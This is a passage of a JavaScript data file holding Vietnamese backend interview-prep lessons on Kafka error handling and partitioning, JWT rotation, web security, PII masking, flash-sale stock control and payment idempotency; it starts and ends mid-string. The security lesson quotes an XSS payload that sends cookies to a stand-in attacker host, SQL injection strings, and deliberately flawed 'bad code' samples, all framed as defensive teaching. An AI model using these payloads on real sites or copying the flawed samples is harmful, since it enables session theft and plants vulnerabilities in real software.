- Sử dụng \`DeadLetterPublishingRecoverer\` để tự động đóng gói message lỗi kèm thông tin Stack Trace và chuyển hướng (route) sang một topic cách ly riêng biệt: \`orders.DLT\`.
- Sau khi đẩy sang DLT thành công, Consumer commit Offset của message lỗi và tiếp tục xử lý mượt mà hàng ngàn message bình thường tiếp theo!
- Đội ngũ vận hành sẽ nhận cảnh báo qua Slack/PagerDuty để xem xét và replay lại message trong DLT sau khi đã sửa bug.`,
        badCodeTitle: '❌ Nuốt exception hoặc retry vô hạn làm nghẽn toàn bộ luồng',
        badCode: `@KafkaListener(topics = "orders")
public void listen(String message) {
    // ❌ CÁCH 1: Try-catch nuốt lỗi -> Mất sạch dữ liệu của khách, không ai biết!
    // ❌ CÁCH 2: Để exception văng tự do mà không cấu hình ErrorHandler -> Consumer bị đơ vĩnh viễn!
    OrderDto dto = objectMapper.readValue(message, OrderDto.class);
    process(dto);
}`,
        goodCodeTitle: '✅ Cấu hình DefaultErrorHandler với DeadLetterPublishingRecoverer',
        goodCode: `@Configuration
public class KafkaConsumerConfig {

    @Bean
    public CommonErrorHandler errorHandler(KafkaTemplate<Object, Object> template) {
        // 1. Khởi tạo Recoverer: Đẩy tin nhắn lỗi sang topic hậu tố .DLT:
        DeadLetterPublishingRecoverer recoverer = new DeadLetterPublishingRecoverer(template,
                (record, ex) -> new TopicPartition(record.topic() + ".DLT", record.partition()));

        // 2. Thử lại tối đa 3 lần, mỗi lần cách nhau 2 giây (FixedBackOff):
        DefaultErrorHandler errorHandler = new DefaultErrorHandler(recoverer, new FixedBackOff(2000L, 3));

        // 3. Không retry cho các lỗi vô vọng (ví dụ sai format cú pháp JSON chắc chắn retry cũng hỏng):
        errorHandler.addNotRetryableExceptions(DeserializationException.class, IllegalArgumentException.class);

        return errorHandler;
    }
}

// Consumer lắng nghe topic DLT để cảnh báo hoặc can thiệp thủ công:
@KafkaListener(topics = "orders.DLT", groupId = "ops-alert-group")
public void handlePoisonPill(ConsumerRecord<String, Object> record) {
    log.error("CẢNH BÁO: Phát hiện Poison Message tại offset={} | payload={}", record.offset(), record.value());
    alertService.notifySlackChannel("Phát hiện message lỗi trong DLT cần kiểm tra!");
}`,
        interviewTip: 'Khi phỏng vấn được hỏi: "Làm thế nào để giám sát và xử lý khi Consumer Lag tăng đột biến?", hãy trả lời: "Em dùng Prometheus và Grafana để alert khi Consumer Lag vượt ngưỡng. Bước 1: Kiểm tra log xem có dính Poison Pill hay không (nếu có thì điều hướng sang DLT). Bước 2: Nếu do tải quá lớn, tăng số lượng Partition và tăng số lượng Pod Consumer tương ứng để nhân bản tốc độ xử lý song song".'
      },
      {
        id: 'kafka-partition-ordering',
        title: '3. Đảm Bảo Thứ Tự Thông Điệp & Nghệ Thuật Chọn Partitioning Key',
        badge: 'Bản Chất Kiến Trúc',
        summary: 'Kafka chỉ cam kết thứ tự trong CÙNG 1 PARTITION, không cam kết toàn Topic. Luôn truyền Partition Key (như orderId) để sự kiện không bị đảo lộn.',
        explanation: `Một hiểu lầm rất phổ biến: "Kafka đảm bảo thứ tự tin nhắn theo thời gian (FIFO) trên toàn bộ Topic".
**Sự thật phũ phàng:** Kafka **CHỈ ĐẢM BẢO THỨ TỰ TRONG NỘI BỘ TỪNG PARTITION DUY NHẤT**!

**Thảm họa khi không truyền Partition Key:**
- Giả sử Topic \`order-events\` có 3 Partitions ($P_0, P_1, P_2$).
- Một đơn hàng ID = 99 có chuỗi sự kiện nghiệp vụ:
  1. \`ORDER_CREATED\` (Lúc 10:00:00)
  2. \`ORDER_PAID\` (Lúc 10:00:05)
  3. \`ORDER_CANCELLED\` (Lúc 10:00:10)
- Nếu Producer không gửi kèm Key, Kafka sẽ dùng chiến lược Round-Robin:
  - Sự kiện 1 bay vào $P_0$.
  - Sự kiện 2 bay vào $P_1$.
  - Sự kiện 3 bay vào $P_2$.
- Khi 3 Consumer độc lập đọc từ 3 Partition này, Consumer của $P_2$ có thể chạy nhanh hơn và xử lý \`ORDER_CANCELLED\` trước cả khi \`ORDER_CREATED\` được tạo trong Database! Hậu quả: Dữ liệu bị vỡ nát!

**Quy tắc vàng: Luôn dùng Business Key làm Partition Key**
- Khi gọi: \`kafkaTemplate.send("order-events", orderId.toString(), eventPayload);\`.
- Kafka sử dụng thuật toán băm **Murmur2** trên Partition Key:
  \`Partition = murmur2(key) % totalPartitions\`.
- Tất cả các sự kiện có cùng một \`orderId\` sẽ luôn luôn được băm vào **chính xác cùng một Partition duy nhất**!
- Nhờ đó, chúng sẽ được đọc và xử lý theo đúng tuần tự thời gian 100% không bao giờ bị đảo lộn!`,
        badCodeTitle: '❌ Gửi message không có Key khiến sự kiện bị xáo trộn',
        badCode: `@Service
public class BadOrderProducer {
    @Autowired private KafkaTemplate<String, Object> kafkaTemplate;

    public void publishEvent(OrderEvent event) {
        // ❌ GỬI KHÔNG CÓ KEY: Message bị chia đều ngẫu nhiên sang các partition khác nhau!
        // Sự kiện "CANCEL" có thể bị xử lý trước sự kiện "CREATE"!
        kafkaTemplate.send("order-events", event);
    }
}`,
        goodCodeTitle: '✅ Luôn chỉ định Partition Key nhất quán theo nghiệp vụ',
        goodCode: `@Service
@RequiredArgsConstructor
public class SafeOrderProducer {
    private final KafkaTemplate<String, OrderEvent> kafkaTemplate;

    public void publishOrderLifecycleEvent(OrderEvent event) {
        // ✅ TRUYỀN ORDER_ID LÀM KEY:
        // Đảm bảo 100% tất cả sự kiện của cùng 1 đơn hàng luôn vào đúng 1 Partition!
        String partitionKey = String.valueOf(event.orderId());

        kafkaTemplate.send("order-events", partitionKey, event)
            .whenComplete((result, ex) -> {
                if (ex != null) {
                    log.error("Gửi event thất bại cho orderId={}", event.orderId(), ex);
                } else {
                    log.info("Message vào partition={} | offset={}", 
                        result.getRecordMetadata().partition(), 
                        result.getRecordMetadata().offset());
                }
            });
    }
}`,
        interviewTip: 'Câu hỏi bẫy phỏng vấn: "Điều gì xảy ra nếu ta tăng số lượng Partition của một Topic đang chạy trên Production?". Trả lời: "Thuật toán murmur2(key) % new_partitions sẽ ra kết quả partition khác với trước đó! Các message mới của cùng 1 orderId có thể bị chuyển sang partition khác, làm mất tính bảo đảm thứ tự với các message cũ chưa tiêu thụ hết. Vì vậy, tăng partition cần phải lên kế hoạch xả cạn consumer lag hoặc dùng custom partitioner".'
      }
    ]
  },
  {
    id: 'security-auth-mastery',
    title: 'Bảo Mật Ứng Dụng & Authentication/Authorization',
    icon: '🔒',
    accentColor: '#eab308',
    tagline: 'Bảo vệ hệ thống trước OWASP Top 10, phân quyền RBAC/ABAC, JWT Refresh Token Rotation và mã hóa dữ liệu nhạy cảm',
    topics: [
      {
        id: 'jwt-refresh-token-rotation',
        title: '1. Refresh Token Rotation (RTR): Chống Đánh Cắp Session & Token Replay',
        badge: 'Chuẩn Bảo Mật OAuth2',
        summary: 'Access Token sống ngắn (15 phút), Refresh Token sống dài (7 ngày). Mỗi lần cấp Access Token mới, Refresh Token cũ bị HỦY ngay lập tức.',
        explanation: `Trong kiến trúc hiện đại, **JSON Web Token (JWT)** là chuẩn xác thực phổ biến nhất. Nhưng JWT là cơ chế không trạng thái (Stateless): một khi token đã được ký, **server không thể thu hồi token đó trước hạn** trừ khi duy trì Blacklist tốn kém trong Redis!

**Mô hình 2 Token chuẩn mực:**
- **Access Token:** Sống cực ngắn (5 đến 15 phút). Dùng để gọi API hàng ngày. Nếu chẳng may bị lộ thì thiệt hại cũng chỉ kéo dài tối đa 15 phút.
- **Refresh Token:** Sống dài (7 đến 30 ngày). Chỉ dùng đúng một việc duy nhất: Gửi lên endpoint \`/auth/refresh\` để xin cấp cặp token mới.

**Hiểm họa khi dùng Refresh Token tĩnh:**
Nếu hacker đánh cắp được Refresh Token từ máy nạn nhân, hacker có thể liên tục xin Access Token mới và duy trì quyền đăng nhập vĩnh viễn!

**Giải pháp: Refresh Token Rotation (RTR) & Phát hiện xâm nhập (Reuse Detection)**
1. Khi Client gửi Refresh Token $RT_1$ lên để xin token mới:
   - Server kiểm tra $RT_1$ có hợp lệ không.
   - Server lập tức **ĐÁNH DẤU $RT_1$ LÀ ĐÃ SỬ DỤNG (REVOKED)**.
   - Server cấp lại cặp mới toanh: $(AT_2, RT_2)$.
2. **Cơ chế Automatic Reuse Detection:**
   - Nếu hacker dùng lại token $RT_1$ cũ đã bị hủy để xin cấp tiếp ➔ Server nhận diện ngay có hành vi tấn công Replay Attack!
   - **Hành động tức thì:** Server **LẬP TỨC THU HỒI TOÀN BỘ GIA ĐÌNH TOKEN (TOKEN FAMILY)** của tài khoản đó, buộc cả người dùng thật lẫn hacker phải đăng nhập lại từ đầu bằng mật khẩu!`,
        asciiDiagram: `[Client Bình Thường] ──(1. Gửi RT-1)──> [Auth Server]
                                          ├── 2. Hủy RT-1 (Revoke) ✅
                                          └── 3. Cấp cặp mới (AT-2, RT-2) ➔ [Client lưu RT-2]

[Hacker Dùng Lại RT-1] ──(Gửi RT-1 cũ)──> [Auth Server]
                                          ├── Phát hiện RT-1 ĐÃ BỊ HỦY! ⚠️
                                          ├── BÁO ĐỘNG: Token Replay Attack! 🚨
                                          └── THU HỒI TOÀN BỘ Session của User (Đá văng cả 2)!`,
        badCodeTitle: '❌ Refresh Token dùng mãi không đổi và lưu LocalStorage',
        badCode: `// ❌ LỖI 1: Lưu Access/Refresh Token trong LocalStorage -> Dễ dàng bị đánh cắp bởi mã độc XSS!
localStorage.setItem("refreshToken", token);

// ❌ LỖI 2: Dùng Refresh Token cấp Access Token mới nhưng giữ nguyên Refresh Token cũ:
@PostMapping("/refresh")
public AuthResponse refresh(@RequestBody String oldRefreshToken) {
    // Không đổi Refresh Token -> Hacker giữ được token là sở hữu tài khoản vĩnh viễn!
    return new AuthResponse(generateAccessToken(userId), oldRefreshToken);
}`,
        goodCodeTitle: '✅ Refresh Token Rotation & Lưu trữ trong HttpOnly Cookie',
        goodCode: `@PostMapping("/refresh")
public ResponseEntity<TokenResponse> refreshToken(HttpServletRequest request, HttpServletResponse response) {
    // 1. Đọc Refresh Token từ HttpOnly Cookie (JavaScript không thể đọc trộm -> Miễn nhiễm XSS):
    String refreshToken = extractTokenFromCookie(request);

    // 2. Xác thực và áp dụng cơ chế Rotation:
    TokenFamily family = tokenService.validateAndRotate(refreshToken);
    if (family.isReused()) {
        // PHÁT HIỆN DÙNG LẠI: Thu hồi toàn bộ session của tài khoản ngay lập tức!
        tokenService.revokeAllSessions(family.getUserId());
        throw new SecurityException("Phát hiện hành vi gian lận token! Toàn bộ phiên đăng nhập đã bị hủy.");
    }

    // 3. Cấp cặp token mới:
    String newAccessToken = tokenService.createAccessToken(family.getUserId());
    String newRefreshToken = tokenService.createRefreshToken(family);

    // 4. Ghi đè Refresh Token mới vào HttpOnly Secure Cookie:
    ResponseCookie cookie = ResponseCookie.from("refreshToken", newRefreshToken)
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .path("/api/v1/auth")
            .maxAge(Duration.ofDays(7))
            .build();
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    return ResponseEntity.ok(new TokenResponse(newAccessToken));
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Nên lưu JWT ở đâu trên Frontend: LocalStorage hay Cookie?", hãy trả lời ngay: "Không bao giờ lưu Refresh Token trong LocalStorage vì nó dễ bị đánh cắp qua lỗ hổng XSS. Chuẩn an toàn nhất là lưu Access Token trong bộ nhớ RAM của ứng dụng (hoặc Closure), còn Refresh Token được lưu trong Cookie có cờ HttpOnly, Secure và SameSite=Strict để trình duyệt tự quản lý an toàn tuyệt đối".'
      },
      {
        id: 'sql-injection-xss-csrf',
        title: '2. Phòng Chống Tam Đại Lỗ Hổng Web: SQLi, XSS & CSRF Trong Spring Boot',
        badge: 'OWASP Top 10 Sống Còn',
        summary: 'SQLi -> Parameterized Queries; XSS -> Content-Security-Policy & Escape HTML; CSRF -> SameSite Cookie & CSRF Token.',
        explanation: `3 lỗ hổng bảo mật kinh điển nhất trong các ứng dụng web mà bất kỳ lập trình viên nào cũng phải thuộc lòng cách phòng chống:

**1. SQL Injection (SQLi):**
- Hacker chèn các ký tự SQL đặc biệt (\`' OR 1=1 --\`) vào ô tìm kiếm hoặc tham số URL để bẻ gãy câu truy vấn và đọc trộm toàn bộ database.
- **Phòng chống:** Tuyệt đối không nối chuỗi SQL thủ công! Luôn dùng **Parameterized Queries** (\`PreparedStatement\`, Spring Data JPA với dấu \`:param\`).

**2. Cross-Site Scripting (XSS):**
- Hacker gửi đoạn mã JavaScript độc hại (ví dụ: \`<script>fetch('http://hacker.com?stolen=' + document.cookie)</script>\`) vào phần bình luận hoặc tên người dùng. Khi người khác xem trang đó, trình duyệt tự động thực thi đoạn script này.
- **Phòng chống:**
  - Escape toàn bộ HTML đầu ra (React/Angular tự động escape mặc định).
  - Cấu hình header **Content-Security-Policy (CSP)** để cấm trình duyệt thực thi inline script từ các nguồn lạ.
  - Lưu token trong \`HttpOnly Cookie\` để JavaScript bị vô hiệu hóa khi cố đọc \`document.cookie\`.

**3. Cross-Site Request Forgery (CSRF):**
- Hacker lừa nạn nhân bấm vào một đường link độc hại trong khi nạn nhân vẫn đang giữ phiên đăng nhập ở trang ngân hàng. Trình duyệt tự động gửi kèm Session Cookie tới ngân hàng để thực hiện lệnh chuyển tiền!
- **Phòng chống:** Cấu hình thuộc tính \`SameSite=Strict\` trên Cookie và kiểm tra CSRF Token cho các ứng dụng web dạng Server-Side Rendering (Thymeleaf/JSP).`,
        badCodeTitle: '❌ Nối chuỗi SQL và tắt CSRF bừa bãi',
        badCode: `// ❌ LỖI SQLi CHẾT NGƯỜI: Nối chuỗi thô trong câu lệnh SQL:
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
// Nếu username = "admin' --", hacker đăng nhập thành công không cần mật khẩu!

// ❌ Tắt CSRF vô tội vạ trong Spring Security mà không hiểu bản chất:
http.csrf(AbstractHttpConfigurer::disable); // Nguy hiểm nếu dùng Session Cookie!`,
        goodCodeTitle: '✅ Parameterized Query & Spring Security 6 cấu hình chuẩn',
        goodCode: `// ✅ 1. Dùng Named Parameters trong Spring Data JPA chống 100% SQLi:
public interface UserRepository extends JpaRepository<User, Long> {
    @Query("SELECT u FROM User u WHERE u.username = :username AND u.status = :status")
    Optional<User> findActiveUser(@Param("username") String username, @Param("status") String status);
}

// ✅ 2. Cấu hình Spring Security 6 chuẩn mực cho REST API:
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            // Với Stateless REST API dùng Bearer Token trong Header, ta có thể tắt CSRF an toàn:
            .csrf(AbstractHttpConfigurer::disable)
            .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .headers(headers -> headers
                // Bật Content-Security-Policy chống XSS:
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
                // Chống Clickjacking:
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/v1/public/**", "/api/v1/auth/**").permitAll()
                .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .build();
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Tại sao trong các tutorial Spring Boot người ta hay viết csrf.disable()?", hãy trả lời: "Vì CSRF chỉ nguy hiểm khi hệ thống dùng Cookie để xác thực người dùng (trình duyệt tự động đính kèm Cookie trong cross-site request). Đối với Stateless REST API dùng Authorization Header (Bearer JWT), trình duyệt không tự đính kèm header này nên CSRF không thể tấn công được, do đó ta có thể disable CSRF để đơn giản hóa kiến trúc".'
      },
      {
        id: 'data-masking-audit',
        title: '3. Bảo Vệ Dữ Liệu Cá Nhân (PII Masking) & Dấu Vết Kiểm Toán (Audit Trail)',
        badge: 'Tuân Thủ Pháp Lý',
        summary: 'Tuyệt đối cấm in số thẻ tín dụng, mật khẩu, CCCD dạng thô ra log. Tự động che mờ (Masking) và ghi nhận Audit Log ai đã sửa gì.',
        explanation: `Trong các dự án doanh nghiệp, đặc biệt là Fintech, Ngân hàng, Y tế và Thương mại điện tử:
Tuân thủ các tiêu chuẩn bảo mật như **PCI-DSS** (thẻ thanh toán) và **GDPR / Nghị định 13** (bảo vệ dữ liệu cá nhân) là bắt buộc.

**1. PII Masking (Che mờ dữ liệu cá nhân nhạy cảm):**
- **Thông tin PII gồm:** Số thẻ tín dụng, mật khẩu, số CMND/CCCD, email, số điện thoại.
- **Quy tắc vàng:** **TUYỆT ĐỐI KHÔNG BAO GIỜ GHI PII DẠNG RÕ (PLAINTEXT) RA FILE LOG HOẶC MÀN HÌNH!**
- Nếu một lập trình viên vô tình log toàn bộ \`userRequest\` chứa số thẻ tín dụng, file log được đẩy lên Elasticsearch/Datadog và hàng trăm người trong công ty có thể nhìn thấy ➔ Công ty sẽ bị tước giấy phép hoạt động và bị phạt hàng triệu USD!
- Định dạng che mờ chuẩn:
  - Số thẻ: \`4111-XXXX-XXXX-1111\` (chỉ giữ 4 số đầu và 4 số cuối).
  - Số điện thoại: \`0987***321\`.
  - Email: \`k*****@gmail.com\`.

**2. Audit Trail (Dấu vết kiểm toán):**
- Khi xảy ra tranh chấp hoặc nghi ngờ gian lận nội bộ (ví dụ: một nhân viên tự ý tăng hạn mức tín dụng cho người quen):
- Hệ thống bắt buộc phải trả lời được chính xác 4 câu hỏi:
  1. **Ai** là người thực hiện thay đổi (\`created_by\`, \`modified_by\`)?
  2. **Thời điểm nào** (\`created_at\`, \`modified_at\`)?
  3. **Địa chỉ IP** và nguồn gốc request từ đâu?
  4. **Giá trị trước và sau khi thay đổi (Old Value vs New Value)** là gì?
- Công cụ: Sử dụng **Spring Data JPA Auditing** kết hợp **Hibernate Envers** để tự động lưu lịch sử thay đổi vào bảng \`_AUD\` riêng biệt.`,
        badCodeTitle: '❌ Log toàn bộ dữ liệu thẻ thô vi phạm chuẩn PCI-DSS',
        badCode: `@PostMapping("/pay")
public ResponseEntity<?> processPayment(@RequestBody PaymentRequest req) {
    // ❌ THẢM HỌA BẢO MẬT: In trần trụi số thẻ và mã CVV ra log hệ thống!
    log.info("Xử lý thanh toán cho request: {}", req);
    // Log ghi lại: PaymentRequest[cardNumber=4532123456789012, cvv=888, pin=1234] -> Vi phạm pháp luật!
}`,
        goodCodeTitle: '✅ Tự động che PII bằng Jackson Serializer & JPA Auditing',
        goodCode: `// ✅ 1. DTO tự động che mờ thông tin nhạy cảm khi serialize/log:
public record PaymentRequest(
    String accountHolder,
    @JsonSerialize(using = CardNumberMaskSerializer.class)
    String cardNumber,
    @JsonIgnore // CVV tuyệt đối không lưu và không serialize ra log!
    String cvv
) {
    // Custom toString() che mờ để log an toàn:
    @Override
    public String toString() {
        return "PaymentRequest[holder=" + accountHolder + ", card=" + maskCard(cardNumber) + "]";
    }

    private static String maskCard(String num) {
        if (num == null || num.length() < 8) return "****";
        return num.substring(0, 4) + "-XXXX-XXXX-" + num.substring(num.length() - 4);
    }
}

// ✅ 2. Kích hoạt JPA Auditing tự động lưu vết ai đã sửa dữ liệu:
@Entity
@EntityListeners(AuditingEntityListener.class)
public class Account {
    @Id private Long id;
    private BigDecimal balance;

    @CreatedBy
    @Column(updatable = false)
    private String createdBy;

    @LastModifiedDate
    private Instant lastModifiedDate;

    @LastModifiedBy
    private String lastModifiedBy; // Tự động lấy username từ Spring SecurityContext!
}`,
        interviewTip: 'Người phỏng vấn hỏi: "Tại sao không nên băm (hash) mật khẩu bằng MD5 hay SHA-256?". Hãy trả lời: "MD5 và SHA-256 là các thuật toán tính toán quá nhanh (hàng tỷ phép tính/giây trên GPU), rất dễ bị bẻ khóa bằng Rainbow Table hoặc Brute-force. Mật khẩu bắt buộc phải được băm bằng các thuật toán Key Derivation Function chậm rãi và có Salt ngẫu nhiên như BCrypt, PBKDF2 hoặc Argon2 để chống tấn công phần cứng chuyên dụng".'
      }
    ]
  }
,

  // ==========================================
  // PHẦN BỔ SUNG: TRI THỨC HỆ THỐNG CHỊU TẢI CAO & SYSTEM DESIGN THỰC CHIẾN
  // ==========================================
  {
    id: 'high-concurrency-architecture',
    title: 'Hệ Thống Chịu Tải Cao & Flash Sale',
    icon: '🚀',
    accentColor: '#f59e0b',
    tagline: 'Giải mã các bài toán triệu request từ kênh Tips Javascript: Flash Sale Overselling, Idempotency chuẩn Stripe, Delay Queue, MPTT Comments, Deadlock chuyển tiền & Transactional Outbox',
    topics: [
      {
        id: 'flash-sale-overselling',
        title: '1. Bán Hàng Tồn Kho Cực Hạn (Flash Sale) & Phòng Vệ Đa Tầng (Anti-Overselling)',
        badge: 'Bài Toán Triệu View',
        summary: 'Hàng triệu request ập tới mua 10 sản phẩm flash sale. Tuyệt đối không update trực tiếp MySQL. Dùng kiến trúc 4 lớp: Nginx Rate Limit -> Redis Lua Script trừ kho nguyên tử -> Kafka Async Queue -> DB Commit.',
        explanation: `Trong các sự kiện Flash Sale (Seckill), kịch bản kinh hoàng nhất là **Overselling (Bán quá số lượng tồn kho / Bán âm kho)** và **Database Deadlock**:
1. **Tại sao MySQL sập khi chịu 100,000 req/s?**
   - Nếu chạy câu lệnh: \`UPDATE products SET stock = stock - 1 WHERE id = 1 AND stock > 0;\`
   - Mỗi câu lệnh \`UPDATE\` đều phải chiếm **Row Exclusive Lock (X-Lock)** trên bản ghi sản phẩm. Hàng chục ngàn transaction cùng tranh chấp một hàng duy nhất sẽ dẫn đến hiện tượng **Lock Contention** nghẽn cứng Thread Pool, connection timeout và crash toàn bộ Database!

2. **3 Cấp độ trừ tồn kho (Từ ngây thơ đến Big Tech):**
   - **Cấp độ 1 (Junior):** Đọc từ DB (\`SELECT stock\`) -> Kiểm tra \`if (stock > 0)\` trong Java -> \`UPDATE stock = stock - 1\`. Thất bại 100% vì Race Condition giữa các thread!
   - **Cấp độ 2 (Fresher):** Dùng Pessimistic Lock (\`SELECT ... FOR UPDATE\`) hoặc Optimistic Lock (\`stock = stock - qty WHERE stock >= qty\`). An toàn dữ liệu nhưng làm DB chậm như rùa, không thể chịu nổi tải quá 2,000 req/s.
   - **Cấp độ 3 (Senior / Chuẩn Big Tech):** **Phòng vệ đa tầng (Multi-Layer Defense)**:
     - **Tầng 1 (Cổng Gateway):** Nginx + Lua Rate Limiting chặn bot, cào dữ liệu và chỉ cho phép lưu lượng hợp lệ đi tiếp.
     - **Tầng 2 (In-Memory Pre-Deduction):** Nạp toàn bộ tồn kho lên Redis Cluster trước giờ G. Dùng **Redis Lua Script** kiểm tra và trừ tồn kho trực tiếp trên RAM với tốc độ sub-millisecond (chạy atomic 100% không lo race condition).
     - **Tầng 3 (Hàng đợi bất đồng bộ):** Những request trừ Redis thành công sẽ được đẩy vào **Kafka / RabbitMQ topic \`order-created\`** để phân tán áp lực ghi đĩa.
     - **Tầng 4 (Ghi bền vững xuống DB):** Worker Consumer đọc từ Kafka với tốc độ ổn định (ví dụ 1,000 đơn/s) và ghi vào PostgreSQL/MySQL mà không hề làm nghẽn DB.`,
        asciiDiagram: `[100,000 User Request/s]
           │
           ▼
┌────────────────────────────────────────┐
│ Tầng 1: Nginx Rate Limiter / Gateway   │ ──(Chặn 90% bot, spam click)──> [Drop 429 Too Many Requests]
└──────────────────┬─────────────────────┘
                   │ (10,000 Hợp lệ/s)
                   ▼
┌────────────────────────────────────────┐
│ Tầng 2: Redis In-Memory + Lua Script   │ ──(Tồn kho = 0? ➔ Hết hàng)──> [Trả về: "Đã hết vé/sản phẩm"]
└──────────────────┬─────────────────────┘
                   │ (Chỉ 10 User trừ kho thành công!)
                   ▼
┌────────────────────────────────────────┐
│ Tầng 3: Kafka Message Queue            │ ──(Đệm tải bất đồng bộ)
└──────────────────┬─────────────────────┘
                   │ (Poll 100 msg/batch)
                   ▼
┌────────────────────────────────────────┐
│ Tầng 4: Order Worker -> MySQL/Postgres │ ──(Ghi bền vững, sinh mã đơn hàng không áp lực)
└────────────────────────────────────────┘`,
        badCodeTitle: '❌ Đọc rồi ghi trong Java khiến kho bị bán âm',
        badCode: `@Transactional
public void buyProduct(Long productId, int quantity) {
    // ❌ CỰC KỲ NGUY HIỂM: 20 luồng cùng đọc thấy stock = 1
    Product product = productRepository.findById(productId).orElseThrow();
    if (product.getStock() >= quantity) {
        // Cả 20 luồng cùng trừ -> Kho từ 1 biến thành -19 (Overselling)!
        product.setStock(product.getStock() - quantity);
        productRepository.save(product);
        createOrder(productId, quantity);
    } else {
        throw new OutOfStockException("Hết hàng");
    }
}`,
        goodCodeTitle: '✅ Trừ kho nguyên tử bằng Redis Lua Script + Kafka',
        goodCode: `// 1. Lua Script chạy Atomic trực tiếp trong Redis RAM:
String LUA_DECREMENT_STOCK = """
    local stock = tonumber(redis.call('get', KEYS[1]) or 0)
    local qty = tonumber(ARGV[1])
    if stock >= qty then
        redis.call('decrby', KEYS[1], qty)
        return 1 -- Thành công
    else
        return 0 -- Hết hàng
    end
""";

@Service
@RequiredArgsConstructor
public class FlashSaleService {
    private final StringRedisTemplate redisTemplate;
    private final KafkaTemplate<String, OrderMessage> kafkaTemplate;

    public boolean placeOrder(Long productId, Long userId, int quantity) {
        String stockKey = "flashsale:stock:" + productId;
        DefaultRedisScript<Long> script = new DefaultRedisScript<>(LUA_DECREMENT_STOCK, Long.class);
        
        // Chạy nguyên tử trên Redis: Không bao giờ bị Race Condition!
        Long result = redisTemplate.execute(script, List.of(stockKey), String.valueOf(quantity));
        
        if (result != null && result == 1) {
            // Đẩy vào Kafka để worker lưu DB sau (Decoupled & Async):
            kafkaTemplate.send("flashsale-orders", new OrderMessage(userId, productId, quantity));
            return true;
        }
        return false; // Báo khách đã hết hàng ngay lập tức (1ms latency!)
    }
}`,
        interviewTip: 'Khi phỏng vấn Tech Lead hỏi: "Nếu một khách hàng trừ kho Redis thành công nhưng đến bước thanh toán họ hủy đơn thì hoàn kho thế nào?", hãy trả lời: "Dùng cơ chế 2 giai đoạn: Kho trên Redis chỉ là Frozen Stock (Kho tạm giữ) với TTL tương ứng (ví dụ 15 phút). Khi hết 15 phút mà không thanh toán, Delay Queue (RabbitMQ DLX hoặc Redis ZSET) sẽ kích hoạt một Lua Script khác: INCRBY trả lại tồn kho vào Redis để người khác mua tiếp". Bạn sẽ ghi điểm 10/10!'
      },
      {
        id: 'idempotent-api-stripe',
        title: '2. Thiết Kế API Idempotency Chuẩn Stripe: Chống Trừ Tiền Trùng Lặp',
        badge: 'Chuẩn Thanh Toán Quốc Tế',
        summary: 'Mạng chập chờn hoặc người dùng bấm nút 2 lần có thể gây trừ tiền 2 lần. Áp dụng header x-idempotency-key, Redis SETNX phân tán và máy trạng thái chuẩn Stripe.',
        explanation: `Trong kiến trúc Backend và Payment Gateway, **Idempotency (Tính khả hoán)** là yêu cầu bắt buộc:
*Một request khi được gửi đi 1 lần hay 10 lần với cùng một định danh thì kết quả trên hệ thống vẫn chỉ sinh ra 1 hiệu ứng duy nhất, không nhân bản dữ liệu.*

**Kịch bản gây thảm họa nếu thiếu Idempotency:**
1. Khách bấm nút "Thanh toán 1,000,000đ".
2. Server trừ tiền tài khoản thành công và tạo hóa đơn.
3. Đúng lúc Server chuẩn bị trả về HTTP 200 thì kết nối 4G của khách bị rớt gói tin (Network Timeout).
4. Phía Client/App tự động kích hoạt cơ chế **Auto-Retry** hoặc khách tưởng chưa ăn nên bấm tiếp lần 2.
5. Server nhận request mới và tiếp tục trừ thêm 1,000,000đ nữa của khách!

**Quy trình chuẩn Stripe giải quyết Idempotency:**
1. **Client sinh UUIDv4:** Trước khi gọi API tạo đơn/thanh toán, client sinh một \`x-idempotency-key\` (ví dụ: \`idem_89a7f3d0-1234\`) gửi kèm trong HTTP Header.
2. **Atomic Lock tại Redis:** Server kiểm tra và chiếm khóa phân tán: \`SET lock:idem:<key> 1 NX EX 120\` (khóa 120s).
   - Nếu trả về \`0\` (khóa đã tồn tại) ➔ Có một request khác cùng key đang xử lý dở ➔ Trả về HTTP 409 Conflict hoặc chờ kết quả.
3. **Kiểm tra bộ nhớ kết quả (Result Cache):**
   - Nếu key đã có kết quả (trạng thái \`SUCCESS\`) trong DB/Redis ➔ **Trả về ngay kết quả cached của lần trước kèm Header \`Idempotent-Replayed: true\`** mà không chạy lại bất kỳ logic trừ tiền nào!
4. **Thực thi nghiệp vụ:** Nếu là lần đầu tiên, chạy toàn bộ logic thanh toán.
5. **Lưu vết và giải phóng khóa:** Lưu kết quả vào DB/Redis với thời hạn 24-48 giờ để phục vụ các lần retry tiếp theo.`,
        asciiDiagram: `Client (POST /pay, x-idempotency-key: IDEM-123)
       │
       ▼
┌──────────────────────────────────────────────┐
│ Kiểm tra Redis: SET lock:IDEM-123 1 NX EX 120│
└──────────────────────┬───────────────────────┘
                       │
       ┌───────────────┴───────────────┐
       ▼ Lock thành công?              ▼ Lock thất bại? (Đang chạy / Trùng)
┌─────────────────────────┐     ┌────────────────────────────────────┐
│ Đã có kết quả cũ chưa?  │     │ Request khác đang xử lý dở:        │
└────────────┬────────────┘     │ Trả về HTTP 409 hoặc Polling chờ!  │
             │                  └────────────────────────────────────┘
     ┌───────┴───────┐
     ▼ Đã có         ▼ Chưa có (Lần đầu)
┌─────────────────┐ ┌────────────────────────────────────────────────┐
│ Trả ngay Cache cũ│ │ 1. Chạy logic trừ tiền & tạo Order            │
│ Header:         │ │ 2. Lưu kết quả {orderId: 99, status: SUCCESS}  │
│ Idempotent: true│ │ 3. Nhả lock Redis                              │
└─────────────────┘ └────────────────────────────────────────────────┘`,
        badCodeTitle: '❌ Xử lý thanh toán không có Idempotency Key',
        badCode: `@PostMapping("/orders/checkout")
